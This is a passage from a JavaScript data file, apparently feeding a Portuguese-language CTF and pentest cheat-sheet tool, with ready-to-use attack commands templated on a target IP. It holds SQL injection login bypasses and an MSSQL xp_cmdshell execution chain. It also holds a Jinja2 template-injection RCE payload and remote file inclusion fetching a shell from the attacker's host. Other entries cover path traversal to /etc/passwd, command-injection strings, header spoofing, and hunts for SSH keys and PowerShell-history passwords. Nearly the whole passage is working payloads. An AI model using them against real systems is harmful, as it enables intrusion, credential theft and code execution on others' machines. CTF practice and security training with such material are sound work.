      code: "find / -user root -perm /4000 -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux suid perm 4000 root privesc gtfobins"
    },
    {
      id: "linux-suid-u-s",
      title: "Linux - SUID Binaries (-u=s)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Privilege Escalation",
      purpose: "Localizar arquivos com SUID usando sintaxe u=s",
      description: "Busca alternativa para arquivos SUID em todo o sistema de arquivos descartando erros de permiss\u00e3o.",
      code: "find / -perm -u=s -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux suid u=s privesc files"
    },
    {
      id: "linux-sgid-2000",
      title: "Linux - SGID Binaries (/2000)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "sgid",
      context: "Privilege Escalation",
      purpose: "Localizar bin\u00e1rios com bit SGID (execu\u00e7\u00e3o como grupo propriet\u00e1rio)",
      description: "Procura bin\u00e1rios que executam com privil\u00e9gios de grupo (ex: grupo shadow, disk, etc.).",
      code: "find / -perm -g=s -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux sgid perm 2000 group privesc"
    },
    {
      id: "linux-cap-getcap",
      title: "Linux - Capabilities (getcap)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "capabilities",
      context: "Privilege Escalation / Capabilities",
      purpose: "Inspecionar capacidades POSIX em execut\u00e1veis",
      description: "Busca bin\u00e1rios com capacidades como cap_setuid, cap_net_raw ou cap_dac_override para escalonamento.",
      code: "getcap -r / 2>/dev/null",
      showUrl: false,
      keywords: "linux capabilities getcap cap_setuid privesc"
    },
    {
      id: "linux-cron-crontab",
      title: "Linux - Crontab do Usu\u00e1rio e Sistema",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "cron",
      context: "Cron & Scheduled Tasks",
      purpose: "Ver tarefas agendadas em execu\u00e7\u00e3o peri\u00f3dica",
      description: "Examina agendamentos de tarefas locais, scripts em /etc/cron* e tarefas do sistema para identificar scripts vulner\u00e1veis.",
      code: "crontab -l; cat /etc/crontab /etc/cron.*/* 2>/dev/null",
      showUrl: false,
      keywords: "linux cron crontab scheduled tasks privesc"
    },
    {
      id: "linux-cron-systemd-timers",
      title: "Linux - Systemd Timers",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "cron",
      context: "Systemd Scheduled Timers",
      purpose: "Listar timers ativos do systemd que substituem o cron tradicional",
      description: "Mostra servi\u00e7os e timers configurados para execu\u00e7\u00e3o autom\u00e1tica pelo systemd.",
      code: "systemctl list-timers --all 2>/dev/null",
      showUrl: false,
      keywords: "linux systemd timers services privesc"
    },
    {
      id: "linux-path-writable-dirs",
      title: "Linux - Diret\u00f3rios Writable no $PATH",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "path",
      context: "PATH Hijacking",
      purpose: "Verificar se algum diret\u00f3rio do PATH permite escrita",
      description: "Permite criar bin\u00e1rios falsos (ex: curl, tar) em diret\u00f3rios priorit\u00e1rios no PATH que possam ser chamados por scripts root.",
      code: "echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"Writable: $d\"; done",
      showUrl: false,
      keywords: "linux path hijack writable directories environment"
    },
    {
      id: "linux-writable-files",
      title: "Linux - Arquivos Grav\u00e1veis por Qualquer Usu\u00e1rio",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "writable",
      context: "File Permissions",
      purpose: "Localizar arquivos com permiss\u00e3o de escrita para everyone",
      description: "Verifica se arquivos de configura\u00e7\u00e3o (/etc/passwd, /etc/sudoers, scripts .sh) est\u00e3o com permiss\u00e3o indevida de escrita.",
      code: "find / -writable -type f 2>/dev/null | grep -v '^/proc' | grep -v '^/sys' | head -n 40",
      showUrl: false,
      keywords: "linux writable world files permissions"
    },
    {
      id: "linux-writable-dirs",
      title: "Linux - Diret\u00f3rios Grav\u00e1veis Globais",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "writable",
      context: "File Permissions",
      purpose: "Localizar pastas globais com permiss\u00e3o de escrita para cria\u00e7\u00e3o de artefatos",
      description: "Identifica diret\u00f3rios tempor\u00e1rios ou de aplica\u00e7\u00e3o onde \u00e9 poss\u00edvel dropar scripts e execut\u00e1veis.",
      code: "find / -perm -222 -type d 2>/dev/null | head -n 40",
      showUrl: false,
      keywords: "linux writable directories permissions drop"
    },
    {
      id: "linux-tty-spawn",
      title: "Linux - TTY Spawn via Python",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "tty",
      context: "Shell Stabilization",
      purpose: "Criar pseudo-terminal interativo a partir de um shell burro",
      description: "Inicializa um PTY usando Python para permitir execu\u00e7\u00e3o de comandos interativos como su, passwd e sudo.",
      code: ttyPython(),
      showUrl: false,
      keywords: "linux tty pty python spawn bash"
    },
    {
      id: "linux-tty-stty",
      title: "Linux - TTY Full Upgrade (stty raw)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "tty",
      context: "Shell Stabilization",
      purpose: "Habilitar Ctrl+C, hist\u00f3rico e auto-completar no shell reverso",
      description: "Comando executado no terminal local ap\u00f3s colocar o shell em background com Ctrl+Z para restaurar modo raw.",
      code: ttyStty(),
      showUrl: false,
      keywords: "linux tty stty raw echo fg terminal size"
    },
    {
      id: "linux-ssh-keys",
      title: "Linux - Procura de Chaves Privadas SSH",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "ssh_scp",
      context: "SSH & Credenciais",
      purpose: "Localizar chaves privadas id_rsa, id_ecdsa ou id_ed25519 expostas",
      description: "Procura arquivos de chaves SSH em diret\u00f3rios de usu\u00e1rios, backups e pastas tempor\u00e1rias.",
      code: "find / -name \"id_rsa*\" -o -name \"*.pem\" -o -name \"id_ed25519*\" 2>/dev/null",
      showUrl: false,
      keywords: "linux ssh id_rsa keys private pem credentials"
    },
    {
      id: "linux-scp-transfer",
      title: "Linux - Transfer\u00eancia de Arquivo via SCP",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "ssh_scp",
      context: "SSH / SCP Transfer",
      purpose: "Baixar ou enviar arquivo de forma criptografada via SSH",
      description: "Copia arquivos entre hosts utilizando autentica\u00e7\u00e3o SSH existente.",
      code: "scp user@" + ip + ":/path/file ./",
      showUrl: false,
      keywords: "linux scp ssh file copy download upload"
    },
    {
      id: "linux-proxy-ssh-d",
      title: "Linux - Proxy Din\u00e2mico SOCKS via SSH (-D)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "proxy",
      context: "Pivoting & Proxy",
      purpose: "Abrir porta SOCKS local (1080) atrav\u00e9s de conex\u00e3o SSH",
      description: "Permite tunelar ferramentas como proxychains, browser e nmap atrav\u00e9s do host comprometido.",
      code: "ssh -D 1080 -N -f -q user@" + ip,
      showUrl: false,
      keywords: "linux ssh proxy socks dynamic port forward pivot"
    },
    {
      id: "linux-proxy-local-forward",
      title: "Linux - SSH Local Port Forwarding (-L)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "proxy",
      context: "Pivoting & Port Forwarding",
      purpose: "Acessar servi\u00e7o interno (ex: 8080 ou 3306) na porta local",
      description: "Encaminha porta remota do host ou de host interno para o localhost do atacante.",
      code: "ssh -L 8080:127.0.0.1:8080 -N -f user@" + ip,
      showUrl: false,
      keywords: "linux ssh local port forwarding tunnel"
    },
    {
      id: "sqli-auth-or",
      title: "SQLi - Auth Bypass (' OR '1'='1)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "Authentication Bypass",
      purpose: "Burlar formul\u00e1rios de login cl\u00e1ssicos em consultas SQL n\u00e3o preparadas",
      description: "For\u00e7a a cl\u00e1usula WHERE a retornar verdadeiro para todos os registros.",
      code: "' OR '1'='1' -- -",
      showUrl: true,
      keywords: "sqli auth bypass login or 1=1"
    },
    {
      id: "sqli-auth-admin",
      title: "SQLi - Auth Bypass Admin (admin' --)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "Authentication Bypass",
      purpose: "Autenticar diretamente como administrador comentando a valida\u00e7\u00e3o de senha",
      description: "Comenta o restante da query ap\u00f3s especificar o usu\u00e1rio alvo.",
      code: "admin' --",
      showUrl: true,
      keywords: "sqli auth admin comment bypass password"
    },
    {
      id: "sqli-auth-parenthesis",
      title: "SQLi - Auth Bypass com Par\u00eanteses",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "Authentication Bypass",
      purpose: "Quebrar consultas SQL encapsuladas em par\u00eanteses",
      description: "Bypassa logins onde a consulta utiliza WHERE (username = '...' AND password = '...').",
      code: "') OR ('1'='1' -- -",
      showUrl: true,
      keywords: "sqli auth bypass parenthesis brackets"
    },
    {
      id: "sqli-bool-true",
      title: "SQLi - Boolean True Condition",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "boolean",
      context: "Boolean Blind SQLi",
      purpose: "Confirmar vulnerabilidade cega baseada em resposta booleana verdadeira",
      description: "Compara a resposta da aplica\u00e7\u00e3o quando a condi\u00e7\u00e3o injetada \u00e9 verdadeira.",
      code: "' AND 1=1 -- -",
      showUrl: true,
      keywords: "sqli boolean blind true condition 1=1"
    },
    {
      id: "sqli-bool-false",
      title: "SQLi - Boolean False Condition",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "boolean",
      context: "Boolean Blind SQLi",
      purpose: "Confirmar altera\u00e7\u00e3o de comportamento em resposta falsa",
      description: "Se a resposta diferir da condi\u00e7\u00e3o verdadeira, confirma a presen\u00e7a de Boolean Blind SQLi.",
      code: "' AND 1=2 -- -",
      showUrl: true,
      keywords: "sqli boolean blind false condition 1=2"
    },
    {
      id: "sqli-bool-extract",
      title: "SQLi - Boolean Substring Extraction",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "boolean",
      context: "Boolean Blind Extraction",
      purpose: "Extrair caracteres individuais de strings do banco caractere por caractere",
      description: "Testa se o primeiro caractere da vers\u00e3o do banco corresponde ao caractere testado.",
      code: "' AND SUBSTRING(version(),1,1)='5' -- -",
      showUrl: true,
      keywords: "sqli boolean substring extract blind"
    },
    {
      id: "sqli-union-order-by",
      title: "SQLi - UNION Column Count (ORDER BY)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "UNION Based SQLi",
      purpose: "Determinar o n\u00famero exato de colunas retornadas pela query original",
      description: "Incremente o n\u00famero at\u00e9 ocorrer erro para identificar a quantidade de colunas.",
      code: "' ORDER BY 1 -- -",
      showUrl: true,
      keywords: "sqli union order by column count"
    },
    {
      id: "sqli-union-select-null",
      title: "SQLi - UNION SELECT NULL Test",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "UNION Based SQLi",
      purpose: "Testar compatibilidade de tipos e reflex\u00e3o em tela",
      description: "Preenche as colunas com NULL para verificar onde os dados podem ser refletidos.",
      code: "' UNION SELECT NULL,NULL,NULL -- -",
      showUrl: true,
      keywords: "sqli union select null columns"
    },
    {
      id: "sqli-union-extract-tables",
      title: "SQLi - UNION Extract Tables (Information Schema)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "UNION Based Schema Dump",
      purpose: "Extrair nomes de tabelas existentes no banco de dados",
      description: "Consulta information_schema.tables para listar tabelas do banco de dados atual.",
      code: "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -",
      showUrl: true,
      keywords: "sqli union extract tables information_schema"
    },
    {
      id: "sqli-error-convert",
      title: "SQLi - Error Based (CONVERT MSSQL)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "error",
      context: "Error Based SQLi (MSSQL)",
      purpose: "For\u00e7ar convers\u00e3o de tipo para vazar dados na mensagem de erro do banco",
      description: "Provoca erro de convers\u00e3o revelando o resultado da subquery no log de erro exibido na p\u00e1gina.",
      code: "' AND 1=CONVERT(int, (SELECT @@version)) -- -",
      showUrl: true,
      keywords: "sqli error based convert mssql leak"
    },
    {
      id: "sqli-error-updatexml",
      title: "SQLi - Error Based (updatexml MySQL)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "error",
      context: "Error Based SQLi (MySQL)",
      purpose: "Vazar dados na mensagem de erro de sintaxe XPath",
      description: "Utiliza updatexml ou extractvalue no MySQL para refletir dados na resposta de erro.",
      code: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) -- -",
      showUrl: true,
      keywords: "sqli error based updatexml mysql xpath leak"
    },
    {
      id: "sqli-time-mysql",
      title: "SQLi - Time Based (MySQL SLEEP)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "time",
      context: "Time Based Blind SQLi (MySQL)",
      purpose: "For\u00e7ar atraso na resposta para confirmar execu\u00e7\u00e3o de c\u00f3digo SQL",
      description: "Se a resposta demorar 5 segundos, confirma a vulnerabilidade sem necessidade de retorno visual de dados.",
      code: "' AND SLEEP(5) -- -",
      showUrl: true,
      keywords: "sqli time based blind sleep 5 mysql"
    },
    {
      id: "sqli-time-mssql",
      title: "SQLi - Time Based (MSSQL WAITFOR DELAY)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "time",
      context: "Time Based Blind SQLi (MSSQL)",
      purpose: "For\u00e7ar atraso em consultas do SQL Server",
      description: "Utiliza a instru\u00e7\u00e3o WAITFOR DELAY para pausar a execu\u00e7\u00e3o da consulta.",
      code: "; WAITFOR DELAY '0:0:5' --",
      showUrl: true,
      keywords: "sqli time based waitfor delay mssql"
    },
    {
      id: "sqli-time-postgres",
      title: "SQLi - Time Based (PostgreSQL pg_sleep)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "time",
      context: "Time Based Blind SQLi (PostgreSQL)",
      purpose: "For\u00e7ar pausa em bancos PostgreSQL",
      description: "Utiliza a fun\u00e7\u00e3o nativa pg_sleep para atrasar a resposta em segundos.",
      code: "' AND (SELECT pg_sleep(5)) --",
      showUrl: true,
      keywords: "sqli time based pg_sleep postgresql"
    },
    {
      id: "sqli-comments-dash",
      title: "SQLi - Coment\u00e1rio Dash Dash (-- -)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "comments",
      context: "SQL Syntax / Truncation",
      purpose: "Comentar o restante da consulta SQL em MySQL, MSSQL e PostgreSQL",
      description: "O espa\u00e7o ap\u00f3s o segundo tra\u00e7o \u00e9 obrigat\u00f3rio no padr\u00e3o ANSI SQL.",
      code: "-- -",
      showUrl: true,
      keywords: "sqli comments dash syntax truncate"
    },
    {
      id: "sqli-comments-hash",
      title: "SQLi - Coment\u00e1rio Hash (#)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "comments",
      context: "SQL Syntax (MySQL)",
      purpose: "Comentar restante da query em MySQL",
      description: "S\u00edmbolo de coment\u00e1rio em linha \u00fanica no MySQL/MariaDB (usar %23 em URLs).",
      code: "#",
      showUrl: true,
      keywords: "sqli comments hash pound mysql"
    },
    {
      id: "sqli-comments-slash-star",
      title: "SQLi - Coment\u00e1rio Multilinha (/* ... */)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "comments",
      context: "SQL Syntax / WAF Bypass",
      purpose: "Coment\u00e1rios em bloco ou inline bypass de espa\u00e7os",
      description: "Pode ser utilizado para bypass de filtros que bloqueiam espa\u00e7os (ex: SELECT/**/user).",
      code: "/* inline comment */",
      showUrl: true,
      keywords: "sqli comments block slash star waf bypass"
    },
    {
      id: "sqli-dbms-mysql",
      title: "SQLi - DBMS MySQL (Vers\u00e3o, Usu\u00e1rio e DB)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mysql",
      context: "MySQL / MariaDB Identification",
      purpose: "Coletar vers\u00e3o, usu\u00e1rio ativo e nome do banco atual",
      description: "Fun\u00e7\u00f5es fundamentais para reconhecimento de ambiente MySQL.",
      code: "SELECT @@version, user(), database();",
      showUrl: true,
      keywords: "sqli dbms mysql version user database"
    },
    {
      id: "sqli-dbms-mysql-file",
      title: "SQLi - DBMS MySQL (load_file /etc/passwd)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mysql",
      context: "MySQL File Reading",
      purpose: "Ler arquivos do sistema operacional quando FILE privilege est\u00e1 ativo",
      description: "L\u00ea arquivos locais caso o usu\u00e1rio do banco tenha permiss\u00e3o e secure_file_priv permita.",
      code: "SELECT load_file('/etc/passwd');",
      showUrl: true,
      keywords: "sqli dbms mysql load_file read file"
    },
    {
      id: "sqli-dbms-postgres",
      title: "SQLi - DBMS PostgreSQL (Vers\u00e3o e Usu\u00e1rio)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "postgres",
      context: "PostgreSQL Identification",
      purpose: "Identificar detalhes de vers\u00e3o e privil\u00e9gios no PostgreSQL",
      description: "Fun\u00e7\u00f5es nativas de sistema do PostgreSQL.",
      code: "SELECT version(), current_user, current_database();",
      showUrl: true,
      keywords: "sqli dbms postgresql version current_user"
    },
    {
      id: "sqli-dbms-postgres-read",
      title: "SQLi - DBMS PostgreSQL (pg_read_file)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "postgres",
      context: "PostgreSQL File Reading",
      purpose: "Ler arquivos do servidor via superuser ou pg_read_server_files",
      description: "Fun\u00e7\u00e3o nativa para leitura de arquivos no diret\u00f3rio de dados ou sistema.",
      code: "SELECT pg_read_file('/etc/passwd', 0, 1000);",
      showUrl: true,
      keywords: "sqli dbms postgresql pg_read_file"
    },
    {
      id: "sqli-dbms-mssql",
      title: "SQLi - DBMS MSSQL (Vers\u00e3o e SysAdmin Check)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mssql",
      context: "MSSQL Identification",
      purpose: "Checar vers\u00e3o e se a sess\u00e3o atual \u00e9 membro da role sysadmin",
      description: "Se IS_SRVROLEMEMBER('sysadmin') retornar 1, \u00e9 poss\u00edvel habilitar xp_cmdshell.",
      code: "SELECT @@version, IS_SRVROLEMEMBER('sysadmin');",
      showUrl: true,
      keywords: "sqli dbms mssql sysadmin xp_cmdshell"
    },
    {
      id: "sqli-dbms-mssql-cmdshell",
      title: "SQLi - DBMS MSSQL (Habilitar xp_cmdshell)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mssql",
      context: "MSSQL Remote Code Execution",
      purpose: "Ativar e executar comandos do sistema operacional via SQL Server",
      description: "Habilita configura\u00e7\u00f5es avan\u00e7adas e executa comandos cmd.exe com privil\u00e9gio do servi\u00e7o MSSQL.",
      code: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
      showUrl: true,
      keywords: "sqli dbms mssql xp_cmdshell rce"
    },
    {
      id: "sqli-dbms-sqlite",
      title: "SQLi - DBMS SQLite (Vers\u00e3o e Schema)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "sqlite",
      context: "SQLite Database",
      purpose: "Extrair a vers\u00e3o e todas as instru\u00e7\u00f5es CREATE TABLE do SQLite",
      description: "Consulta a tabela de metadados sqlite_master para mapear colunas e tabelas.",
      code: "SELECT sqlite_version(), sql FROM sqlite_master WHERE type='table';",
      showUrl: true,
      keywords: "sqli dbms sqlite sqlite_version sqlite_master"
    },
    {
      id: "web-hdr-audit",
      title: "Web - HTTP Security Headers Audit",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "headers",
      context: "HTTP Headers Security",
      purpose: "Inspecionar cabe\u00e7alhos de seguran\u00e7a (CSP, HSTS, X-Frame-Options, CORS)",
      description: "Requisita apenas os headers de resposta HTTP para verificar prote\u00e7\u00f5es contra clickjacking, MIME sniffing e XSS.",
      code: "curl -I -s -k http://" + ip + ":" + port + "/",
      showUrl: false,
      keywords: "web headers http curl security csp hsts x-frame"
    },
    {
      id: "web-hdr-xff",
      title: "Web - X-Forwarded-For IP Spoofing",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "headers",
      context: "HTTP Headers Testing",
      purpose: "Bypass de restri\u00e7\u00e3o de IP de rede interna ou painel admin",
      description: "Simula requisi\u00e7\u00e3o originada do localhost (127.0.0.1) atrav\u00e9s de cabe\u00e7alhos de proxy reverso.",
      code: "curl -H \"X-Forwarded-For: 127.0.0.1\" -H \"X-Real-IP: 127.0.0.1\" -H \"X-Custom-IP-Authorization: 127.0.0.1\" http://" + ip + ":" + port + "/admin",
      showUrl: false,
      keywords: "web headers x-forwarded-for x-real-ip spoofing bypass"
    },
    {
      id: "web-hdr-host",
      title: "Web - Host Header Injection",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "headers",
      context: "HTTP Headers Testing",
      purpose: "Testar vulnerabilidade de envenenamento de cache ou reset de senha",
      description: "Envia um cabe\u00e7alho Host arbitr\u00e1rio para verificar se a aplica\u00e7\u00e3o reflete em links gerados.",
      code: "curl -H \"Host: evil.com\" http://" + ip + ":" + port + "/password_reset",
      showUrl: false,
      keywords: "web headers host header injection cache poison"
    },
    {
      id: "web-ssti-jinja2-test",
      title: "Web - SSTI Jinja2 Test ({{7*7}})",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "ssti",
      context: "Server-Side Template Injection (Python)",
      purpose: "Confirmar avalia\u00e7\u00e3o de express\u00f5es em templates Jinja2 / Flask",
      description: "Se a resposta renderizar 49 em vez do texto bruto {{7*7}}, o template engine est\u00e1 executando c\u00f3digo.",
      code: "{{7*7}}",
      showUrl: true,
      keywords: "web ssti jinja2 flask python 7*7"
    },
    {
      id: "web-ssti-jinja2-rce",
      title: "Web - SSTI Jinja2 Remote Code Execution",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "ssti",
      context: "Server-Side Template Injection (Python)",
      purpose: "Executar comandos do sistema operacional atrav\u00e9s de subclasses do Python",
      description: "Navega pelas subclasses do Python para instanciar subprocess.Popen ou os.popen.",
      code: "{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}",
      showUrl: true,
      keywords: "web ssti jinja2 rce python popen"
    },
    {
      id: "web-ssti-twig",
      title: "Web - SSTI Twig Test (PHP)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "ssti",
      context: "Server-Side Template Injection (PHP)",
      purpose: "Testar template engine Twig em aplica\u00e7\u00f5es PHP / Symfony",
      description: "Verifica execu\u00e7\u00e3o de express\u00f5es em templates Twig.",
      code: "{{7*'7'}}",
      showUrl: true,
      keywords: "web ssti twig php symfony"
    },
    {
      id: "web-rfi-http",
      title: "Web - RFI HTTP Include",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "rfi",
      context: "Remote File Inclusion",
      purpose: "Incluir script PHP hospedado no servidor do atacante",
      description: "Requer que allow_url_include esteja habilitado no php.ini.",
      code: "http://" + ip + ":" + port + "/index.php?page=http://" + ip + ":8000/shell.txt?",
      showUrl: true,
      keywords: "web rfi remote file inclusion http php"
    },
    {
      id: "web-rfi-smb",
      title: "Web - RFI via SMB Share (Windows)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "rfi",
      context: "Remote File Inclusion (SMB)",
      purpose: "Burlar restri\u00e7\u00e3o de allow_url_include no Windows usando caminho UNC",
      description: "O PHP no Windows trata compartilhamentos SMB (\\\\ip\\share) como arquivos locais.",
      code: "\\\\" + ip + "\\share\\shell.php",
      showUrl: true,
      keywords: "web rfi smb unc windows bypass"
    },
    {
      id: "web-traversal-classic",
      title: "Web - Path Traversal (/etc/passwd)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "traversal",
      context: "Path Traversal",
      purpose: "Retroceder diret\u00f3rios para ler o arquivo de contas do Linux",
      description: "Sequ\u00eancia cl\u00e1ssica de diret\u00f3rios pai para alcan\u00e7ar o diret\u00f3rio raiz.",
      code: "../../../../../../../../etc/passwd",
      showUrl: true,
      keywords: "web traversal path etc passwd dot dot slash"
    },
    {
      id: "web-traversal-double-encode",
      title: "Web - Path Traversal (Double URL Encode)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "traversal",
      context: "Path Traversal / WAF Bypass",
      purpose: "Burlar filtros que realizam apenas uma rodada de URL decode",
      description: "Codifica %2e%2e%2f duas vezes (%252e%252e%252f).",
      code: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
      showUrl: true,
      keywords: "web traversal double url encode bypass waf"
    },
    {
      id: "web-cmdi-pipe",
      title: "Web - Command Injection (Pipe |)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "cmdi",
      context: "OS Command Injection",
      purpose: "Redirecionar sa\u00edda e encadear comando arbitr\u00e1rio",
      description: "Utiliza pipe para passar resultado ao pr\u00f3ximo comando executado pelo shell.",
      code: "127.0.0.1 | whoami",
      showUrl: true,
      keywords: "web cmdi command injection pipe whoami"
    },
    {
      id: "web-cmdi-semicolon",
      title: "Web - Command Injection (Semicolon ;)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "cmdi",
      context: "OS Command Injection",
      purpose: "Separador de instru\u00e7\u00f5es em ambientes Linux/Unix",
      description: "Finaliza o comando original e executa o comando injetado subsequentemente.",
      code: "127.0.0.1; id",
      showUrl: true,
      keywords: "web cmdi command injection semicolon id"
    },
    {
      id: "web-cmdi-subshell",
      title: "Web - Command Injection (Subshell $(...))",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "cmdi",
      context: "OS Command Injection",
      purpose: "Interpolar comandos dentro de argumentos de programas",
      description: "O interpretador Bash avalia o conte\u00fado interno do subshell antes de executar o comando principal.",
      code: "$(id)",
      showUrl: true,
      keywords: "web cmdi subshell command injection interpolation"
    },
    {
      id: "cheat-linux-enum",
      title: "Linux - Enumera\u00e7\u00e3o B\u00e1sica de Sistema",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "linux",
      context: "Linux CTF Cheatsheet",
      purpose: "Identificar OS, arquitetura, usu\u00e1rio atual e privil\u00e9gios sudo",
      description: "Primeiros comandos executados ao obter acesso a um host Linux.",
      code: "whoami; id; uname -a; cat /etc/os-release; sudo -l 2>/dev/null",
      showUrl: false,
      keywords: "cheat linux enum whoami id uname sudo"
    },
    {
      id: "cheat-linux-net",
      title: "Linux - Portas em Escuta e Conex\u00f5es (ss / netstat)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "linux",
      context: "Linux Networking",
      purpose: "Descobrir servi\u00e7os locais escutando apenas em 127.0.0.1",
      description: "Identifica bancos de dados, portas de debug e webapps internas n\u00e3o expostas externamente.",
      code: "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null",
      showUrl: false,
      keywords: "cheat linux netstat ss ports listening sockets"
    },
    {
      id: "cheat-win-whoami",
      title: "Windows - Privil\u00e9gios e Grupos Atuais",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "windows",
      context: "Windows CTF Cheatsheet",
      purpose: "Verificar se tokens SeImpersonatePrivilege ou SeDebugPrivilege est\u00e3o ativos",
      description: "Comando essencial para decidir vetor de privilege escalation (ex: JuicyPotato / GodPotato).",
      code: "whoami /priv; whoami /groups",
      showUrl: false,
      keywords: "cheat windows whoami priv groups seimpersonate"
    },
    {
      id: "cheat-win-powershell-history",
      title: "Windows - Hist\u00f3rico do PowerShell",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "windows",
      context: "Windows Post-Exploitation",
      purpose: "Extrair senhas e comandos digitados anteriormente pelo administrador",
      description: "L\u00ea o arquivo ConsoleHost_history.txt onde o hist\u00f3rico do PSReadline fica gravado.",
      code: "type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
      showUrl: false,
      keywords: "cheat windows powershell history credentials psreadline"
    },
    {
      id: "cheat-ad-domain-admins",
      title: "Active Directory - Listar Membros de Domain Admins",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "ad",
      context: "Active Directory Cheatsheet",
      purpose: "Identificar contas privilegiadas de administra\u00e7\u00e3o do dom\u00ednio",
      description: "Utiliza o comando nativo net.exe para consultar o cat\u00e1logo do dom\u00ednio.",
      code: "net group \"Domain Admins\" /domain",
      showUrl: false,
      keywords: "cheat ad active directory domain admins net group"
    },
    {
      id: "cheat-ad-spn",
      title: "Active Directory - Kerberoasting SPN Search",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "ad",
      context: "Active Directory Cheatsheet",
